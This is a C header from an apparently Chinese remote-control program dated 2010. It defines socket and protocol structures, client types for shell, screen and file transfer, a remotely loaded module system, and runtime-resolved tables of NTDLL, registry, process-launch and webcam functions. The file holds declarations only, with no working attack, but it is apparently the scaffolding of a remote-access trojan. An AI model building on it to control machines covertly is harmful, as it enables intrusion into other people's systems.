/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#ifndef KM_HEAD_H_INCLUDED
#define KM_HEAD_H_INCLUDED

#include <winsock2.h>
#include <windows.h>

typedef
BOOL
(PASCAL FAR * LPFN_ACCEPTEX)(
    IN SOCKET sListenSocket,
    IN SOCKET sAcceptSocket,
    IN PVOID lpOutputBuffer,
    IN DWORD dwReceiveDataLength,
    IN DWORD dwLocalAddressLength,
    IN DWORD dwRemoteAddressLength,
    OUT LPDWORD lpdwBytesReceived,
    IN LPOVERLAPPED lpOverlapped
    );

#define WSAID_ACCEPTEX \
        {0xb5367df1,0xcbac,0x11cf,{0x95,0xca,0x00,0x80,0x5f,0x48,0xa1,0x92}}

typedef
BOOL
(PASCAL FAR * LPFN_CONNECTEX)(
    IN SOCKET s,
    IN const struct sockaddr FAR *name,
    IN int namelen,
    IN PVOID lpSendBuffer OPTIONAL,
    IN DWORD dwSendDataLength,
    OUT LPDWORD lpdwBytesSent,
    IN LPOVERLAPPED lpOverlapped
    );

#define WSAID_CONNECTEX \
    {0x25a207b9,0xddf3,0x4660,{0x8e,0xe9,0x76,0xe5,0x8c,0x74,0x06,0x3e}}

typedef
BOOL
(PASCAL FAR * LPFN_DISCONNECTEX)(
    IN SOCKET s,
    IN LPOVERLAPPED lpOverlapped,
    IN DWORD  dwFlags,
    IN DWORD  dwReserved
    );

#define WSAID_DISCONNECTEX \
    {0x7fda2e11,0x8630,0x436f,{0xa0, 0x31, 0xf5, 0x36, 0xa6, 0xee, 0xc1, 0x57}}


typedef enum _WTS_CONNECTSTATE_CLASS
{
  WTSActive,
  WTSConnected,
  WTSConnectQuery,
  WTSShadow,
  WTSDisconnected,
  WTSIdle,
  WTSListen,
  WTSReset,
  WTSDown,
  WTSInit
}WTS_CONNECTSTATE_CLASS;

typedef struct _WTS_SESSION_INFO {
    DWORD SessionId;
    LPTSTR pWinStationName;
    WTS_CONNECTSTATE_CLASS State;
} WTS_SESSION_INFO,  *PWTS_SESSION_INFO;

#define SOCK_LOOP_RE_COUNT    0x0
#define SOCK_LOOP_RECV_NEXT   0x1
#define SOCK_LOOP_CLOSE       0x2
#define SOCK_LOOP_RECV_HEADER 0x3

enum client_type{C_UNKNOWN,C_CLIENT,C_MAIN,C_UPDOWNFILE,C_ADMIN,C_CMD,C_LISTEN,C_SCREEN};    //客户端是干什么来着的

#pragma pack(1)
typedef struct tag_io_socket{
    SOCKET socket;
    OVERLAPPED overlapped;
    struct sockaddr_in local_addr;
    struct sockaddr_in remote_addr;
    void *f_call_work;
    void *f_call_exit;
    void *f_temp_call_work;
    WSABUF s_buf;
    WSABUF r_buf;
    char *i_buffer;
    int i_length;
    int r_count;
    void *extend;
}io_socket,*pio_socket;
typedef int (*f_work)(int,DWORD,pio_socket,LPOVERLAPPED);

typedef struct tag_io_data_header{
    unsigned long length;
    unsigned long crc32;
    unsigned char major_cmd;
    unsigned char minor_cmd;
    unsigned char error1;
    unsigned char error2;
}io_data_header,*pio_data_header;

typedef struct tag_client_ver{
    unsigned short wVersion;
    unsigned short wSystemVersion;
    unsigned long c_type;
}client_ver,*pclient_ver;

typedef struct tag_km_recv_module{
    unsigned char   majorcmd;
    unsigned long   crc32;
}km_recv_module,*pkm_recv_module;

typedef struct tag_km_module{
    HANDLE hModule;
    unsigned long crc32;
    void *func_init;
    void *func_de_init;
}km_module,*pkm_module;

typedef int (*kms_event_func)(pio_socket i_socket, char *buffer, int length);
typedef struct tag_main_event_func{
    unsigned char count;
    kms_event_func *event_funcs;
}main_event_func;

typedef struct tag_share_func{
    unsigned long *kms_func;
    unsigned long *win32_func;
    unsigned long *ntdll_func;
}share_func,*pshare_func;

typedef struct tag_share_main{
    HANDLE h_completion_port;
    client_ver c_ver;
    char *km_cur_path;
    char *km_mod_path;
    char *remote_addr;
    int remote_port;
    share_func s_func;
    unsigned long km_length;
    char *km_buffer;
    int sock_loop_thread_count;
    HANDLE *sock_loop_thread;
    unsigned long km_module_count;
    pkm_module km_modules;
    main_event_func event_funcs[0xff];
}share_main,*pshare_main;

typedef int (*kms_initialize_module)(pshare_main ps_main);

typedef int (*kms_sock_func)(pio_socket i_socket);

#pragma pack()

//* ***********************************************NTDLL************************************/
typedef long NTSTATUS;
typedef struct _UNICODE_STRING{
    USHORT          Length;
    USHORT          MaximumLength;
    PWSTR           Buffer;
}UNICODE_STRING,*PUNICODE_STRING;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES{
     ULONG Length;
     PVOID RootDirectory;
     PUNICODE_STRING ObjectName;
     ULONG Attributes;
     PVOID SecurityDescriptor;
     PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _PROCESS_DEVICEMAP_INFORMATION{
    union{
            struct{
                HANDLE DirectoryHandle;
            }Set;
            struct{
                ULONG DriveMap;
                UCHAR DriveType[32];
            }Query;
    };
}PROCESS_DEVICEMAP_INFORMATION,*PPROCESS_DEVICEMAP_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef NTSTATUS (__stdcall *pZwQueryInformationProcess)(HANDLE,DWORD,PVOID,ULONG,PULONG);
typedef NTSTATUS (__stdcall *PZwQuerySystemInformation)(DWORD,PVOID,ULONG,PULONG);

typedef NTSTATUS (__stdcall *pZwCreateFile)(PHANDLE,DWORD,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG);
typedef NTSTATUS (__stdcall *pZwOpenFile)(PHANDLE,DWORD,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,ULONG,ULONG);
typedef NTSTATUS (__stdcall *pZwClose)(HANDLE);
typedef NTSTATUS (__stdcall *pZwWriteFile)(HANDLE,HANDLE,PVOID,PVOID,PVOID,ULONG,PLARGE_INTEGER,ULONG);
typedef NTSTATUS (__stdcall *pZwReadFile)(HANDLE,HANDLE,PVOID,PVOID,PVOID,ULONG,PLARGE_INTEGER,ULONG);
typedef NTSTATUS (__stdcall *pZwSetInformationFile)(HANDLE,PIO_STATUS_BLOCK,PVOID,ULONG,DWORD);
typedef NTSTATUS (__stdcall *pZwQueryInformationFile)(HANDLE,PIO_STATUS_BLOCK,PVOID,ULONG,DWORD);

typedef NTSTATUS (__stdcall *pZwCreateKey)(PHANDLE,DWORD,POBJECT_ATTRIBUTES,ULONG,PUNICODE_STRING,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pZwOpenKey)(PHANDLE,DWORD,POBJECT_ATTRIBUTES);
typedef NTSTATUS (__stdcall *pZwDeleteKey)(HANDLE);
typedef NTSTATUS (__stdcall *pZwSetValueKey)(HANDLE,PUNICODE_STRING,ULONG,ULONG,PVOID,ULONG);
typedef NTSTATUS (__stdcall *pZwDeleteValueKey)(HANDLE,PUNICODE_STRING);
typedef NTSTATUS (__stdcall *pZwQueryValueKey)(HANDLE,PUNICODE_STRING,DWORD,PVOID,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pZwQueryKey)(HANDLE,DWORD,PVOID,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pZwEnumerateKey)(HANDLE,ULONG,DWORD,PVOID,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pZwEnumerateValueKey)(HANDLE,ULONG,DWORD,PVOID,ULONG,PULONG);

typedef NTSTATUS (__stdcall *pZwQueryDirectoryFile)(HANDLE,HANDLE,DWORD,PVOID,PIO_STATUS_BLOCK,PVOID,ULONG,DWORD,BOOLEAN,PUNICODE_STRING,BOOLEAN);

#define ZwQueryInformationProcess(h1,h2,h3,h4,h5)   ((pZwQueryInformationProcess)g_share_main->s_func.ntdll_func[0])(h1,h2,h3,h4,h5)
#define ZwQuerySystemInformation(h1,h2,h3,h4)       ((PZwQuerySystemInformation)g_share_main->s_func.ntdll_func[1])(h1,h2,h3,h4)
#define ZwCreateFile(h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11) \
                    ((pZwCreateFile)g_share_main->s_func.ntdll_func[2])(h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11)

#define ZwOpenFile(h1,h2,h3,h4,h5,h6)   \
                    ((pZwOpenFile)g_share_main->s_func.ntdll_func[3])(h1,h2,h3,h4,h5,h6)

#define ZwClose(h)  ((pZwClose)g_share_main->s_func.ntdll_func[4])(h)

#define ZwQueryDirectoryFile(h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11)    \
                    ((pZwQueryDirectoryFile)g_share_main->s_func.ntdll_func[18])(h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11)

/* **********************************************NTDLL_END***********************************/


/* **********************************************SOCK***************************************
unsigned long kms_func[] = {
    (unsigned long)kms_sock_connect,
    (unsigned long)kms_sock_ret_connect,
    (unsigned long)kms_sock_send,
    (unsigned long)kms_sock_close,
    (unsigned long)kms_file_write,
    (unsigned long)km_main_connect,
    (unsigned long)km_main_parse
};
*/
typedef int (*p_kms_sock_connect)(char *host,int port,f_work f_connect_event,kms_sock_func f_exit_event,void *extend);
typedef int (*p_kms_sock_ret_connect)(char *host,int port,f_work f_connect_event);
typedef int (*p_kms_sock_send)(pio_socket i_socket,unsigned char major_cmd,unsigned char minor_cmd,unsigned long crc32,char *buffer,int length);
typedef int (*p_kms_sock_close)(pio_socket i_socket);

#define k_sock_connect(h1,h2,h3,h4,h5) ((p_kms_sock_connect)g_share_main->s_func.kms_func[0])(h1,h2,h3,h4,h5)
#define k_sock_ret_connect(h1,h2,h3) ((p_kms_sock_ret_connect)g_share_main->s_func.kms_func[1])(h1,h2,h3)
#define k_sock_send(h1,h2,h3,h4,h5,h6) ((p_kms_sock_send)g_share_main->s_func.kms_func[2])(h1,h2,h3,h4,h5,h6)
#define k_sock_close(h1) ((p_kms_sock_close)g_share_main->s_func.kms_func[3])(h1)

/* **********************************************SOCK_END************************************/


/* **********************************************WIN32**************************************
unsigned long win32_func[] = {
0    (unsigned long)CloseHandle,
1    (unsigned long)CreateFile,
2    (unsigned long)WriteFile,
3    (unsigned long)ReadFile,
4    (unsigned long)GetSystemInfo,
5    (unsigned long)QueryPerformanceFrequency,
6    (unsigned long)GlobalMemoryStatus,
7    (unsigned long)GetSystemMetrics,
8    (unsigned long)GetAdaptersInfo,
9    (unsigned long)GetVersionEx,
a    (unsigned long)capGetDriverDescription,
b    (unsigned long)CreateProcess,
c    (unsigned long)WaitForSingleObject
d    (unsigned long)_beginthreadex
e    (unsigned long)MultiByteToWideChar
f    (unsigned long)WideCharToMultiByte
10   (unsigned long)FileTimeToLocalFileTime
11   (unsigned long)WinExec
12   (unsigned long)DeleteFile
13   (unsigned long)RemoveDirectory
14   (unsigned long)CreateDirectory
15   (unsigned long)GetFileSize
16   (unsigned long)lzw_enchode
17   (unsigned long)lzw_dechode
18   (unsigned long)WTSEnumerateSessions
19   (unsigned long)WTSFreeMemory
};
*/

typedef int _stdcall (*p_CloseHandle)(HANDLE hObject);
typedef HANDLE __stdcall (*p_CreateFile)(LPCTSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile);
typedef BOOL __stdcall (*p_WriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
typedef BOOL __stdcall (*p_ReadFile)(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped);

typedef int _stdcall (*p_CreateProcess)(LPCSTR, LPCSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL , DWORD , LPVOID , LPSTR , LPSTARTUPINFOA , LPPROCESS_INFORMATION );
typedef int _stdcall (*p_WaitForSingleObject)( HANDLE hHandle, DWORD dwMilliseconds );
typedef unsigned long _stdcall (*p_beginthreadex)(void *, unsigned, unsigned (__stdcall *) (void *), void*, unsigned, unsigned*);

typedef int __stdcall (*p_MultiByteToWideChar)(UINT CodePage,DWORD dwFlags,LPCSTR lpMultiByteStr,int cbMultiByte,LPWSTR lpWideCharStr,int cchWideChar);
typedef int __stdcall (*p_WideCharToMultiByte)(UINT CodePage,DWORD dwFlags,LPCWSTR lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,int cbMultiByte,LPCSTR lpDefaultChar,LPBOOL lpUsedDefaultChar);
typedef BOOL __stdcall (*p_FileTimeToLocalFileTime)(const FILETIME* lpFileTime,LPFILETIME lpLocalFileTime);
typedef UINT __stdcall (*p_WinExec)(LPCSTR lpCmdLine,UINT uCmdShow);
typedef BOOL __stdcall (*p_DeleteFile)(LPCTSTR lpFileName);
typedef BOOL __stdcall (*p_RemoveDirectory)(LPCTSTR lpPathName);
typedef BOOL __stdcall (*p_CreateDirectory)(LPCTSTR lpPathName,LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef DWORD __stdcall (*p_GetFileSize)(HANDLE hFile,LPDWORD lpFileSizeHigh);

typedef void (*p_lzw_enchode)(unsigned char *src,int srclen,unsigned char *dest,int *destlen);
typedef void (*p_lzw_dechode)(unsigned char *src,int srclen,unsigned char *dest,int *destlen);

typedef BOOL __stdcall (*p_WTSEnumerateSessions)(HANDLE hServer,DWORD Reserved,DWORD Version,PWTS_SESSION_INFO* ppSessionInfo,DWORD* pCount);
typedef void _stdcall (*p_WTSFreeMemory)(PVOID pMemory);


#define k_CloseHandle(h1) ((p_CloseHandle)g_share_main->s_func.win32_func[0])(h1)
#define k_CreateFile(h1,h2,h3,h4,h5,h6,h7) ((p_CreateFile)g_share_main->s_func.win32_func[1])(h1,h2,h3,h4,h5,h6,h7)
#define k_WriteFile(h1,h2,h3,h4,h5) ((p_WriteFile)g_share_main->s_func.win32_func[2])(h1,h2,h3,h4,h5)
#define k_ReadFile(h1,h2,h3,h4,h5) ((p_ReadFile)g_share_main->s_func.win32_func[3])(h1,h2,h3,h4,h5)

#define k_CreateProcess(h1,h2,h3,h4,h5,h6,h7,h8,h9,h10) ((p_CreateProcess)g_share_main->s_func.win32_func[0xb])(h1,h2,h3,h4,h5,h6,h7,h8,h9,h10)
#define k_WaitForSingleObject(h1,h2) ((p_WaitForSingleObject)g_share_main->s_func.win32_func[0xc])(h1,h2)
#define k_beginthreadex(h1,h2,h3,h4,h5,h6) ((p_beginthreadex)g_share_main->s_func.win32_func[0xd])(h1,h2,h3,h4,h5,h6)
#define k_MultiByteToWideChar(h1,h2,h3,h4,h5,h6) ((p_MultiByteToWideChar)g_share_main->s_func.win32_func[0xe])(h1,h2,h3,h4,h5,h6)
#define k_WideCharToMultiByte(h1,h2,h3,h4,h5,h6,h7,h8) ((p_WideCharToMultiByte)g_share_main->s_func.win32_func[0xf])(h1,h2,h3,h4,h5,h6,h7,h8)
#define k_FileTimeToLocalFileTime(h1,h2) ((p_FileTimeToLocalFileTime)g_share_main->s_func.win32_func[0x10])(h1,h2)
#define k_WinExec(h1,h2) ((p_WinExec)g_share_main->s_func.win32_func[0x11])(h1,h2)
#define k_DeleteFile(h1) ((p_DeleteFile)g_share_main->s_func.win32_func[0x12])(h1)
#define k_RemoveDirectory(h1) ((p_RemoveDirectory)g_share_main->s_func.win32_func[0x13])(h1)
#define k_CreateDirectory(h1,h2) ((p_CreateDirectory)g_share_main->s_func.win32_func[0x14])(h1,h2)
#define k_GetFileSize(h1,h2) ((p_GetFileSize)g_share_main->s_func.win32_func[0x15])(h1,h2)
#define k_lzw_enchode(h1,h2,h3,h4) ((p_lzw_enchode)g_share_main->s_func.win32_func[0x16])(h1,h2,h3,h4)
#define k_lzw_dechode(h1,h2,h3,h4) ((p_lzw_dechode)g_share_main->s_func.win32_func[0x17])(h1,h2,h3,h4)
#define k_WTSEnumerateSessions(h1,h2,h3,h4,h5) ((p_WTSEnumerateSessions)g_share_main->s_func.win32_func[0x18])(h1,h2,h3,h4,h5)
#define k_WTSFreeMemory(h1) ((p_WTSFreeMemory)g_share_main->s_func.win32_func[0x19])(h1)
/* **********************************************WIN32_END***********************************/

#endif // KM_HEAD_H_INCLUDED
